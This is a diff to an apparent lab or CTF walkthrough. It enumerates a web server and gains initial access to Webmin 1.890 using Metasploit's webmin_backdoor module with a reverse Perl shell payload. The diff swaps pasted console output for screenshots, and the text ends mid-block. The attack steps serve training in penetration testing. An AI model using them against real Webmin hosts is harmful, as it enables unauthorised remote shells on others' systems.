@@ -28,7 +28,6 @@
 - Search for html, php and txt files
 
 ![[feroxbuster.png]]
-
 - Nothing of interest was found - seems just like a default Apache server
 
 ## Initial Access
@@ -37,27 +36,10 @@
 - From nmap we can see we have webmin 1.890 running on port 10000
 - This version is vulnerable to a backdoor exploit that we can run using metasploit
 
-```
-Metasploit tip: Use the resource command to run
-commands from a file
-Metasploit Documentation: https://docs.metasploit.com/
-
-msf6 > search webmin 1.89
-
-Matching Modules
-================
-
-   #  Name                                Disclosure Date  Rank       Check  Description
-   -  ----                                ---------------  ----       -----  -----------
-   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor
-```
-
+![[webmin-search.png]]
 - We can then setup the exploit with the options for the victim server and run the exploit
 
-
+![[webmin-setup.png]]
 ```
 msf6 > use 0
 [*] Using configured payload cmd/unix/reverse_perl
